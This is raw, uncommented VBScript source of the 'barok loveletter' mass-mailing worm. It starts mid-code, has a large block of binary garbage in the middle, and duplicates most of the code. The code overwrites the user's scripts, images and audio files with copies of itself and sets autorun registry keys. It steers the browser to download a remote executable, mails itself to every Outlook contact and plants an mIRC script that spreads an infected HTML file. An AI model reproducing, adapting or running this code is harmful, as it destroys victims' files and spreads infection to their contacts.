regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\Very Funny.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     
���I�
:�~�m�+sX�c�d�Db��E�E���/����c��tGA��]?"{=�5��~AO��k��R�Qt�el�r�ҩ��''ZO4N���=rh�̉��%	)W.�^j^�]�Ǘ���/��8@����҂������ᧇ�a�u���NxsI��,�%H�h�}�AmP�-q����\w���e(�Ughr;��ކ��n9�������� `�(�oB�����s�tj�4�h�#գ�q�i���������6���	�.�1or�H�^�WЁ�N��F��c���06����$މ�I�V��OKDn��B7�oS�!��f*QU�P�������j�Y�����<�ss��]�*�����5o~~�O������<j��n�����݁�.�'~���Ճ5\U�^����CU����iu�*<��ʷ�|AAu�k�X���C�`}J�:�I2gØ/��$���FB-�]D���ޏ��J��hJ��-OJ�#�iw���J��q(�/h-�Ȋ���\e�z�rB��P�*)����_�D?���� A���C8�zp���S�\l�=�Qj���H������ 819QO�8���,](r�j���'i�B?�F,��Y��ʨU]n�\hP��y:zχ�<d��{�=�=p��-������ }��h#mo��#�D{�71��h��z�y���'��THuUn��Yu)�	%3g���v�0�lH��2Hv�V0U��eU\dXI�"6%\���h)�c4.d���$ &T��<5E�2��װ�]��^����,����I������l�F�2�����i�ՠUE��88F���X~
���Q��������ŖAѢ$!�h������K)��k���⑕(�#ԗGA�=YIN@��=Cl��=����3�kJ���[��zXF0G�G>lFX"�1�ÀBd�~��&n�η��.c�������7ONZ��u�4��-��7�+u`źi�	
����X�;i��RP��b�*���D�U^�ds�"��("�f�l�q������v�A�6��`
��-]]&�z�H��%LZi�JL\�*����sln�,�R����`�fU8�m?��i@��r�Z���CMQ\mrO�����7'�e<5�Z%�T�t��圮��M���"h=�]I%H����v�a���(��= |a�s��N����ڳѝ�s��	�c��n��G�<��	���PV�G�ð5�$Ԡ� � �����.�'�Ԅ����o��U(�|�Ȧn7�W^Vb�X�
�,ӗ�/c_�`�}�.�.�(�jRd�5J=�ڿ@R���ZU��5pIE0T*)�)\�fS�u�v�V+0+a�Ug�� j��ڀ��o��nA+��YJ�UЬ��-�p]��:.frє�0U+�c��k�s��P�t����cU"��d���Z΂�����젽u���h,�8��4�E�T�a~6����,�Ģ�Ty���TXYP��Iҕ���G������
V����
�6�T�[Us�ͻ��b���5�\�7 �g)F�c��T��x��ʣ���9U"���AZ@]k���9�ɠ��������p����eS-�ݪ�
6�*P7��%+^��ϕ������&:�������R�S�֧��d�����l���ʦiշ���0�N�4�����6B]%��ki��[ �X��^5af+�.��(4wQ7��q�*�/`��-���+j�6�IA�8b�e9l%��p��Q��7���a5&o,B�NV�O�M\��K��"R��P������\�ʄ��6�R��Ja�V�!W�Qq`��t
�$)L�8�m��0�6�N���\?����,?>�s�� �,=s=�\#Έ�a�5D��|�j��E�fq��Tb��R�HT�Įv�&<S��p�%:���\̄��Dˬ���	7���b7x��<�eZ�����j��uAa�z-��P�ەך�:��p�8���
�������剃���j'�h,TL��E�K��N�\��٭�P>�M�t7�77
7$�,�!^T��TXK�?�=lG�oCe�ΦG��T�y�	5w�-|'[��G���.ϷU Enl��H�P���߼2r)q%tA"Ar]�����Ȩ	ù����
���ȴ�\e]N[P-���P�� ��l�%P0]�%V?^���߭:r]�lS4��!g��[z�t-�>���my���Vt5ΫЗ��H^��s^_M�^�&���B���b}�Ri����(�0sg�p�Im��̆�G�R-ľ�Ӓ�V�T�LٱH�}�"�-��<W)�l��W~����ޛf�ghf�h��ffhh��ffhh��ffh��L�0�|FRp�O������݋­6�*�-��=��U�a��ù�K5�imՅ�9���<%�u��$\mֹwb4��.OG��t��+�����/��=8��׮��A��Z�N�Ts���ȃ�K���{(����G��l�mA͇�A��Z�����/Q�~����J�P����zJm6���9l��Oдu"�*W�-��ZD�'�\`b��J\<����[Ilb��%�4���|�Mqiy�t�bظ���1�׎��(�n�G��<�%�l��8fx���񟔻%-`n}�>�J`eK�_+·�K25�+2�1Nw;#�2����?������ihr��g�4��Uo˩�MR/�>�g�V4������W���q��*�{ΰ�vr�b�,
�/�W�Y���!��£�([�y�HJ<^;R�{�֫5gG��'4�f	`�s�ר�e�i��_;5��;�U#��U��~�����H��g]/��:�`oq��t2a�,J��A�PE�S�hY^ds�߰�x{��,��X{|�̺�ë�|��Ej'�2�)a�gP3�Msz-w�6���n�P3ݍ}˺3b�P*�w�?��f#-�I-*�C�`V�5�n3�d��m!j���ыc 1L��4���  ���q�\�A"�۷��v��D�a&S@�b���p1�I�C�Uw�R�p=iGLR�b�X$B*],1����H�͕��[�3�X���T7�0S耸��wǦ$���©e�����$����	�RV+\1qu�	1X���f?i�2�[��[� �;���p�n��Y 9����@�-AA~�w������W�u9V'�-�⚻?�~J����� ���
�{&��@�P���"  �xu�]�����z���_s�&�A5?n��:�����E�����Qr@�� a$�����PĬ��j0�	8�=�a�|�I�I��ѵ�a��*-"z����A-�����Ww��������6o��=�޸-Ɨ�3](���vQ��S6�fs-S	�2�ا��m{�����p-s�-l���C�c��ޖ�S�NsZ�_�֖��H�	F�ޒ�B�2�n�J��/�����U�e�F�G��F��l�6����\tS �*?�Vm[ġ��f)���m/�*�<��҉i{+T��H3@(�٥X�-YD܎#��D����Mu�9�*��]����9��� �tj!Ȑ��NB�ҡ(5�ث��a^Xn){��a�t��'%��e_k�ip�7\A�VF�%��w���)�n��qq�Yjwڽ����i7�Y�����K�pݍߋ���[R|�_뜦�z�"���&�Y��Y-w������#ɉ"�i 01k[�ʯ� n%՝����"����ɬ1�0R<W�����n� '��2g��,��:���������i0��dM��e�kM$��&h3��"�{�����Of^?+��-�;;�%[���Nr$w�����d��VV�/S#m�e�&7���p�gY�^_��^6��`i���?����t��d0��-꺒s��E��~�ZGcI��hf�u~4�D�(i���z�����*_�~�/N��p�
�����%t��>�;P�+��1�W
-��|�ޮ|���RT�<���B�M�&qY�S�;���=_=h�.�����|\�����=xg?"�S-�M4���+QK1����v�C�Z6��k�a)á�� ������L�����Z|b��ZF�E���ޟ�܂�1U��n�2�x픂}�%Eb�#N8��g�o�}s]�`3wrF��8]�Gq��&�=�Ћ�߽�3a�����A+N�6�憜x(C}����6/��@�.�}�r��`�T�Z_�_ ���1�T�[�ņ�i�?�zFy$�a���"�YbǙ6ӱ���b��P.��Ӣ���X�l����I<�&�i���(��'Z7����;!Ch�G��~<4��AY'��|��Y�x#��>-�߽ۜ���Bt����پ��������uN�r����˴�^��t��և��)\�Uo���؅;���{i\�<�/j���r��9�{�<��vD7
~ҥ[��'HԘ��s6�������$j��ٙ����i�K�Q��Z2�i�|� ��d\��&��9>5#D�;X�+I�C��8��ƹ �m7�$��B�:�u��/���g�"b�Y��[�������{�~z"d�V�`�X���:���y�M{�@mQ�A��\fOX��A%QHv��Е����j]���?6�Y�����է��(U6O4�~��<�@;��D^�;�e���̕��꫁GBH26-Yhf�E�G�C�{zBʟ�F�Ҳ�y:�T�n�2�@���4����˕�l�w��&�}�����]in'�������GZ58���Zm'iF*_��m�<�V%���{�`�Hj��NI���Z���wX���w���U��"T��ouC����kZm�ųgpH2��A4��Z5��`��aRC@h:d��Hs:8t � �; �9pu��Fkx�W�`��5퇮d:pk��,uJ��c�N"���͎���M��z�Z�p����J!��z9g ��zuÛ���NH<tA9��1�>�]�K���X8ՃK��Z?�,�i�;��QU���?y�$�jw�}��Z_ә������X��ц8>�����s��'&����� c�h�|��d�9�$�q��B��q�����:x����B�]�ىpa���Zs29'�.J�x"�`SD����Q~t�$E̹J�x�[>���^#��X� ��>FS���}#�Mla�zb�e�:�I���H�?p� ������7�Mҏ�(�>��߹LE����u��:v��� �$��j�݇��FQ6�P�|:Hw����<0���6��Mp)������y�|	��o ����}���$���x�8O����,4�G�!\?�R�J�%�i~_�H�-� �"��Ϳ�7*�6?�I�#1H�0KRuu!#6�����h*:b�/�{tD�Ʀ�
[fS������s�G�"Ӫ�բ�tR���=��L���b/F�8b�#����:�ܖ~o��M�"`4!e���J�P�0�#���F���z���0�nI�wr-������x_����:hƕġ�i����
��n�K�0�FRj��A�f9==��yG���R��PpK��*��^p����a�lx��~��k,��_r�<���v��$�f:
a�VA�a�R3ˀ��Q{���C���d|�{b��������^ɠ E����s�(�[�3-�k�O�� _���!ӈ|�*$\�����C&�.YThB֖fA�pPl�UM`=���$k�p��B�;�{$��t+Ws,%�W��w	A���XQ�C4O�Gl����Sȳ���f�@륁�x`�w��2,S����/ Fo<4�w9�M��vEsM��N42���u4�.@�����U�.���f	�µ�`��ԟ8$�~��B��C�����@��dWp�����_j����'c��_�������1�r� 	'�d,�(�v��r(3}���oz��vd���v�Þ���)_�?yl�Y�Ӓȶ��FZMK�NR�<MU��bJ����ㄪ�{��(#!)'31rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\Very Funny.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
